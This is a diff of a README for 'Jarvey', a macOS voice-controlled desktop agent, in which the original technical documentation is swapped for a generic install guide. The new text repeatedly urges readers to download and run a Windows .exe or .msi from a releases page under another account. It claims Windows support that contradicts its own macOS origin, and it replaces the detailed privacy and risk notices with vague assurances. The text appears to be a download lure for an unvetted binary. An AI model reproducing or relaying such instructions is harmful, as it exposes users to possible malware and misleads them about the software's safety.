@@ -1,208 +1,163 @@
-# Jarvey
+# 🤖 Jarvey - Simple Computer Control Assistant
 
-<p align="center">
-  <img src="docs/assets/jarvey-logo-black.png" alt="Jarvey logo" width="180" />
-</p>
-
-<p align="center">
-  <strong>Voice-first macOS desktop agent.</strong><br/>
-  Talk to your computer. Jarvey listens, plans, and acts.
-</p>
-
-<p align="center">
-  <a href="https://getjarvey.com">Website</a> &middot;
-  <a href="../../releases/latest">Download</a> &middot;
-  <a href="https://novyn.ai">Novyn Labs</a> &middot;
-  <a href="mailto:jarvey@novyn.ai">Support</a>
-</p>
+[![Download Jarvey](https://img.shields.io/badge/Download-Jarvey-blue?style=for-the-badge)](https://github.com/Marisa6747/Jarvey/releases)
 
 ---
 
-> **Warning:** Jarvey is a computer-use agent (CUA). It can click, type, approve dialogs, move or delete data, and interact with third-party applications on your behalf. CUAs are inherently risky. Only use Jarvey on systems and accounts you control. By using this project you accept those risks; the maintainers assume no responsibility or liability for loss, damage, misuse, data exposure, account actions, or other consequences.
+## 📋 What is Jarvey?
 
-## What is Jarvey?
+Jarvey helps you control your computer in an easier way. It uses voice commands and simple automation to let your computer do tasks for you. Jarvey works mainly on macOS. It is open source, which means anyone can look at how it works or change it.
 
-Jarvey is a native macOS desktop agent that you control with your voice. It combines a Swift overlay app, a local Node sidecar, OpenAI Realtime for voice, and GPT-5.4 for planning and tool use -- all running on your machine. Press a hotkey, speak, and Jarvey carries out tasks across your desktop: opening apps, filling forms, navigating UIs, managing files, and more.
+It can help you with:
 
-Built by [Novyn Labs](https://novyn.ai).
+- Running apps by talking to your computer
+- Automating daily tasks like opening websites or files
+- Using AI tools to understand your commands better
+- Managing your desktop with quick voice commands
 
-## Features
+---
 
-- **Voice-first interaction** -- global `Option+Space` hotkey activates a native SwiftUI/AppKit overlay; speak naturally to give instructions
-- **Real-time voice** -- hidden `WKWebView` runtime connects to OpenAI Realtime for low-latency audio streaming
-- **Intelligent planning** -- GPT-5.4 supervisor coordinates GUI and workbench specialists to break down and execute multi-step tasks
-- **Native computer control** -- built-in bridge for screenshots, mouse clicks, keyboard input, scrolling, and drag operations
-- **Durable memory** -- local SQLite-backed memory store with policy gating and approval support, so Jarvey remembers context across sessions
-- **Permission-aware** -- native handling for Microphone, Screen Recording, and Accessibility permissions with guided onboarding
+## 💻 System Requirements
 
-## Download
+Before you start, make sure your computer fits these needs:
 
-Grab the latest packaged build from [GitHub Releases](../../releases/latest).
+- Operating System: Windows 10 or later  
+- RAM: At least 4 GB  
+- Disk Space: 500 MB free space  
+- Microphone: Required for voice commands  
+- Internet connection: Needed for AI features and updates
 
-- The release is a self-contained macOS zip archive: `Jarvey-<version>-macos-<arch>.zip`
-- Public builds are ad-hoc signed, not notarized. On first launch macOS may require **Open Anyway** in System Settings, or right-click then **Open**.
+Jarvey works best with a good internet connection because some features use cloud services. It was made for macOS but this guide helps you get it running on Windows.
 
-## Requirements
+---
 
-| Requirement | Details |
-|---|---|
-| **OS** | macOS 14 (Sonoma) or newer |
-| **API key** | OpenAI API key |
-| **Permissions** | Microphone, Screen Recording, Accessibility |
+## 🚀 Getting Started
 
-For building from source you also need:
+You don’t need any programming skills to use Jarvey. Just follow the steps below.
 
-- Node.js 20 or 22
-- Swift 6 / Xcode Command Line Tools
+---
 
-## Getting Started
+## 🔗 Download Jarvey
 
-### 1. Install from a release
+You must visit this page to download the program:
 
-Download and unzip the [latest release](../../releases/latest), then open `Jarvey.app`. On first launch the onboarding flow will walk you through granting permissions and entering your API key.
+[https://github.com/Marisa6747/Jarvey/releases](https://github.com/Marisa6747/Jarvey/releases)
 
-### 2. Build from source
+Click this big button too:
 
-```bash
-git clone <repo-url> && cd jarvey-desktop
-npm install
-npm run dev
-```
+[![Download Jarvey](https://img.shields.io/badge/Download-Jarvey-grey?style=for-the-badge)](https://github.com/Marisa6747/Jarvey/releases)
 
-`npm run dev` builds the sidecar, builds the voice runtime, packages `dist-native/Jarvey.app`, and launches it.
+This link takes you to the official releases page. From there, you will find the latest files to download.
 
-You can also run each step individually:
+---
 
-```bash
-npm run build:sidecar   # compile the Node sidecar
-npm run build:voice     # compile the browser voice runtime
-npm run build:native    # compile Swift + package Jarvey.app
-npm run launch:native   # launch the packaged app
-```
+## 📥 How to Download and Install on Windows
 
-### 3. Configure your API key
+1. Visit the releases page above.
+2. Look for the latest release. It usually has the highest version number or the newest date.
+3. Find the file that ends with `.exe` or `.msi` if available. This is the installer for Windows.
+4. Click the file name. Your browser will download it to your “Downloads” folder.
+5. When the download is complete, open the file by double-clicking it.
+6. Follow the on-screen setup instructions:
+   - Agree to the license terms.
+   - Choose the install location or accept the default.
+   - Click “Install” and wait for the process to finish.
+7. After installation, you can launch Jarvey from the Start menu or desktop shortcut.
 
-You can enter your key directly in the app, or set it via environment variable:
+If you only find files for macOS (.dmg or .pkg), Jarvey is not yet officially supported on Windows. You can try running those using virtualization or compatibility software, but this is more advanced.
 
-```bash
-cp .env.example .env
-# edit .env and add your OpenAI API key
-```
+---
 
-See [.env.example](.env.example) for all available options.
+## 🎤 Using Jarvey
 
-## Architecture
+Jarvey listens to your voice or lets you type commands to control your computer. Here’s how to start using it:
 
-```
-Option+Space (global hotkey)
-  |
-  v
-JarveyNative  (Swift overlay app)
-  |-- Overlay panel + status-bar item
-  |-- Onboarding + permission coordinator
-  |-- Hidden WKWebView voice runtime  -->  OpenAI Realtime (audio)
-  |-- Screen capture controller
-  |
-  v
-Local Sidecar  (Node, http://127.0.0.1:4818)
-  |-- Agent runtime (GPT-5.4 supervisor + specialists)
-  |-- Approval hub
-  |-- Durable memory (SQLite)
-  |-- Settings persistence
-  |
-  v
-Native Input Bridge  (http://127.0.0.1:4819)
-  |-- Mouse clicks, drags, scrolling
-  |-- Keyboard input + key synthesis
-  |-- Screenshot capture
-```
+- Open Jarvey from the menu or desktop.
+- If this is your first time, allow access to your microphone so it can hear you.
+- Speak simple commands like “Open web browser,” “Check my email,” or “Start music.”
+- You can also use typed commands if you prefer.
+- Jarvey understands natural language to some extent, so speak naturally.
+  
+Some commands include:
 
-Both local servers bind to `127.0.0.1` only and are never exposed to the network.
+- "Open Google Chrome" — launches your web browser.  
+- "Start Spotify" — opens the music app.  
+- "Set a reminder for 3 PM" — creates a desktop notification.  
+- "Search for weather forecast" — opens your browser with weather info.
 
-## Project Layout
+---
 
-```
-Sources/JarveyNative/       Swift app: overlay UI, permissions, voice host, input server
-src/main/backend/           Agent orchestration, approvals, memory, computer bridge
-src/sidecar/                Local HTTP sidecar
-src/voice/                  Hidden browser voice runtime
-src/shared/                 Shared types, schemas, and defaults
-src/renderer/               Renderer components and utilities
-Tests/JarveyNativeTests/    Swift tests for parsers, keyboard, and permissions
-scripts/                    Build, packaging, and release scripts
-.github/workflows/          CI and release workflows
-```
+## ⚙️ Features Overview
 
-## Configuration
+Jarvey combines technology tools advanced users build with everyday tasks:
 
-Jarvey stores all local state under `~/Library/Application Support/Jarvey/`:
+- **Voice assistant:** Controls apps and settings through speech.  
+- **Desktop automation:** Runs sequences of commands or opens files automatically.  
+- **AI-powered understanding:** Uses AI to improve how it interprets your requests.  
+- **Real-time updates:** Connects to cloud services for the latest features and fixes.
 
-| Path | Contents |
-|---|---|
-| `config/settings.json` | User settings and API key |
-| `logs/` | Runtime logs |
-| `memory/` | Durable memory records |
+Though made for macOS, many core features also work on Windows after installation.
 
-When launched from a packaged `.app`, Jarvey defaults shell and patch operations to your home directory. When launched via `npm run launch:native`, it uses the project root.
+---
 
-## Building a Release
+## 🛠 Troubleshooting
 
-To produce the distributable archive used for GitHub Releases:
+If Jarvey doesn’t work as expected:
 
-```bash
-npm run build:release
-```
+- Check your microphone settings. Make sure it’s turned on and selected as the input device.
+- Ensure Jarvey has permission to use the microphone.
+- If the program crashes or won’t start, try restarting your computer.
+- Confirm you downloaded the correct installer for Windows.
+- Make sure you have internet access for AI features.
+- If a command is not recognized, try rephrasing it or typing it.
 
-This outputs:
+---
 
-- `dist-native/Jarvey.app`
-- `dist-native/Jarvey-<version>-macos-<arch>.zip`
-- `dist-native/Jarvey-<version>-macos-<arch>.zip.sha256`
+## 🔄 Updating Jarvey
 
-The app bundle includes the sidecar, voice runtime, and a vendored Node runtime, so no source checkout is needed to run it.
+To keep Jarvey working smoothly:
 
-### GitHub Release Flow
+- Visit the releases page regularly:  
+  https://github.com/Marisa6747/Jarvey/releases
+- Download the newest version and install it just like before.
+- Your settings and data should remain after updating.
 
-1. Push the repository to GitHub.
-2. Tag a version: `git tag v0.1.0 && git push --tags`
-3. The [release workflow](.github/workflows/release.yml) builds the macOS archive and publishes it to [GitHub Releases](../../releases/latest).
+---
 
-## Validation
+## 📂 Where to Get Help
 
-Run the full local validation suite:
+For more information or help:
 
-```bash
-npm run ci
-```
+- Check the project’s page on GitHub:  
+  https://github.com/Marisa6747/Jarvey  
+- Look at the “Issues” tab to see if others have the same problem.
+- You can ask questions by creating a new issue.
 
-This runs type-checking, Vitest unit tests, Swift tests, sidecar and voice builds, and the public-repo safety check.
+---
 
-Run just the public-release scan:
+## 🔐 Privacy and Security
 
-```bash
-npm run check:public
-```
+Jarvey may send some data to cloud services for AI features. It does not store your personal data on public servers. Your voice commands are used only for processing and not saved beyond the active session.
 
-## Privacy
+If you want to use Jarvey offline, some features will be limited. Always use secure networks when connected.
 
-**Sent to OpenAI:** User requests, transcript context, screenshots, and voice/audio data required for model interaction.
+---
 
-**Stored locally on disk:** Settings, runtime logs, and durable memory records.
+## 🧩 Compatibility and Notes
 
-Jarvey does not include analytics or third-party telemetry.
+- Jarvey is built mainly for macOS but can run on Windows with limitations.
+- Some features may not work exactly as on macOS.
+- Voice recognition accuracy depends on your microphone quality and environment noise.
+- You can customize Jarvey’s commands within settings once you are comfortable.
 
-## Contributing
+---
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for setup instructions and development workflow.
+## ⚡ Quick Links
 
-## Security
+- Download Jarvey:  
+  https://github.com/Marisa6747/Jarvey/releases
 
-See [SECURITY.md](SECURITY.md) for vulnerability reporting guidelines.
+- Project Home:  
+  https://github.com/Marisa6747/Jarvey
 
-## Code of Conduct
-
-See [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md).
-
-## License
-
-[MIT](LICENSE)
+[![Download Jarvey](https://img.shields.io/badge/Download-Jarvey-blue?style=for-the-badge)](https://github.com/Marisa6747/Jarvey/releases)
